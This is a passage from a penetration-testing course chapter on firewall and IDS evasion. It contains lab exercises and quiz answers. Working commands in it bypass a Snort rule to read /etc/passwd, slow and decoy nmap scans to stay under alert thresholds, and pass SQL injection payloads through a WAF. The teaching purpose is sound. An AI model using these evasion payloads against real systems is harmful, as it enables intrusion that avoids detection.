alert tcp any any -> any 80 (
    msg:"Passwd file access";
    flow:to_server,established;
    content:"/etc/passwd";
    sid:1000001;
)
```

**Test Baseline**:
```bash
curl http://192.168.1.100/etc/passwd
# Alert triggered
```

**Bypass 1 - URL Encoding**:
```bash
curl http://192.168.1.100/%65tc/passwd
# Snort: No alert (pattern doesn't match)
# Server: Decodes and serves file
```

**Bypass 2 - Case Variation** (if server is case-insensitive):
```bash
curl http://192.168.1.100/ETC/PASSWD
```

**Bypass 3 - Path Traversal**:
```bash
curl http://192.168.1.100/etc/./passwd
curl http://192.168.1.100/etc/../etc/passwd
```

### Lab 2: Fragmentation Evasion

**Objective**: Split malicious payload across packets.

**Setup**:
```bash
# Configure small MTU
sudo ifconfig eth0 mtu 500

# Run attack
curl http://192.168.1.100/etc/passwd

# Packets are automatically fragmented
# Snort may fail to reassemble if timeout configured low
```

**Verify**:
```bash
# Capture traffic
tcpdump -i eth0 -w attack.pcap

# Analyze in Wireshark
# Look for fragmented IP packets
```

### Lab 3: Timing Evasion

**Objective**: Evade rate-based detection.

**Snort Rule**:
```
alert tcp any any -> any 80 (
    msg:"Port scan detected";
    flags:S;
    threshold: type threshold, track by_src, count 10, seconds 60;
    sid:1000002;
)
```

**Test Baseline**:
```bash
# Fast scan (triggers alert)
nmap -p 1-100 192.168.1.100
```

**Bypass**:
```bash
# Slow scan (under threshold)
nmap -T1 --scan-delay 10s -p 1-100 192.168.1.100

# 10 seconds between packets
# Only 6 packets per minute
# Threshold: 10 in 60 seconds
# Result: No alert
```

### Lab 4: Decoy Evasion

**Objective**: Hide real IP in noise.

```bash
nmap -D 192.168.1.5,192.168.1.10,ME,192.168.1.15,192.168.1.20 -p 80 192.168.1.100

# Snort logs show scans from 5 IPs
# Analyst must investigate all 5
# Real IP (ME) hidden in the crowd
```

### Lab 5: Application Layer Evasion

**Objective**: Bypass WAF SQL injection detection.

**Baseline**:
```bash
curl "http://192.168.1.100/search?q=' OR 1=1--"
# WAF blocks
```

**Bypass 1 - Comment Injection**:
```bash
curl "http://192.168.1.100/search?q='/**/OR/**/1=1--"
```

**Bypass 2 - Case Variation**:
```bash
curl "http://192.168.1.100/search?q=' oR 1=1--"
```

**Bypass 3 - Parameter Pollution**:
```bash
curl "http://192.168.1.100/search?q='&q=OR&q=1=1--"
```

---

## 16. Critical Analysis & Checkpoints

### 16.1 Common Pitfalls

**1. Over-Evasion**:
- Too much obfuscation can break exploits
- Balance between evasion and functionality

**2. Ignoring Logs**:
- Even if attack succeeds, logs may reveal you
- Post-exploitation cleanup crucial

**3. Modern Defenses**:
- AI/ML-based detection adapts
- Zero-trust architecture eliminates implicit trust
- EDR monitors endpoints regardless of network evasion

**4. Fragmentation Limitations**:
- Modern IDS/IPS reassemble properly
- Requires deep knowledge of target OS reassembly

### 16.2 Checkpoint Questions

**Q1**: What is a "False Positive"?
- **Answer**: The IDS alerts on benign traffic (e.g., legitimate SQL query triggers SQL injection alert). High false positive rate leads to alert fatigue and missed real attacks.

**Q2**: How does a "Side-Channel" attack apply to networking?
- **Answer**: Inferring information through indirect observation. Example: Timing differences between "user exists" and "user doesn't exist" errors reveal valid usernames.

**Q3**: Why does `-sS` (SYN Scan) bypass some logging?
- **Answer**: SYN scan doesn't complete the TCP handshake. Applications typically log connections only when they reach ESTABLISHED state. SYN scan never reaches this state.

**Q4**: What's the difference between IDS and IPS?
- **Answer**: IDS (Intrusion Detection) passively monitors and alerts. IPS (Intrusion Prevention) actively blocks malicious traffic inline. IPS has higher risk of false positives disrupting legitimate traffic.

**Q5**: How can you detect if a firewall is stateful or stateless?
- **Answer**: Send ACK packet without prior SYN. Stateless firewall may allow it (only checks ACL). Stateful firewall drops it (no matching session in state table).

**Q6**: What is the purpose of the `--badsum` flag in Nmap?
- **Answer**: Sends packets with invalid checksums. OS drops these silently, but some IDS/IPS process them anyway. Allows fingerprinting of security devices.

### 16.3 Real-World Scenarios

**Scenario 1: APT Exfiltration**:
```
Threat: Advanced Persistent Threat exfiltrating data
Evasion Techniques Used:
1. DNS tunneling (low volume, legitimate-looking domains)
2. Timing variation (random delays)
3. Encryption (TLS to common services)
4. Behavioral mimicry (mixed with normal traffic)

Detection:
- Long-term baseline analysis
- DNS query length anomalies
- Uncommon destination countries
- Endpoint behavior analysis (EDR)
```

**Scenario 2: Firewall Bypass for Pen Test**:
```
Target: Web application behind WAF
Goal: Test SQL injection

Attempts:
1. Direct injection: Blocked by WAF
2. URL encoding: Blocked
3. Parameter pollution: Bypassed!
   ?id=1&id=' OR 1=1--
   WAF checks first parameter (1)
   App uses last parameter (' OR 1=1--)

Result: Successfully demonstrated vulnerability
```

### 16.4 The Future of Evasion

**Challenges**:
- Machine learning detection (adapts to new patterns)
- Behavioral analysis (focuses on intent, not signatures)
- End-to-end encryption (TLS 1.3, QUIC)
- Zero-trust architecture (no implicit trust)
- Cloud-native security (distributed, scalable)

**Evolution**:
```
Past: Bypass signature matching
Present: Evade behavioral analysis
Future: Exploit AI/ML blind spots

Shift: Network evasion → Endpoint evasion
New Focus: Living-off-the-land, memory-only attacks
```

### 16.5 Final Thoughts

Evasion is an arms race. Security devices get smarter, attacks get subtler. The fundamental tension:

**Security Dilemma**:
- Strict rules = high false positives (disrupts business)
- Loose rules = high false negatives (misses attacks)
- Perfect balance impossible

**Modern Reality**:
- Network visibility decreasing (encryption everywhere)
- Endpoint visibility increasing (EDR, XDR)
- Focus shifting from perimeter to identity and endpoint

**Key Takeaways**:
- Understand defender's constraints (performance, resources)
- Exploit logical gaps, not just technical vulnerabilities
- Blend attacks with legitimate traffic
- Test evasion techniques in lab before production
- Stay current with detection capabilities

**Resources**:
- Practice: TryHackMe, HackTheBox evasion rooms
- Research: Black Hat/DEF CON presentations
- Tools: Snort/Suricata rule sets, ModSecurity
- Red team frameworks: Cobalt Strike, Covenant, Metasploit

---

*End of Chapter 09 - Firewall & IDS Evasion*

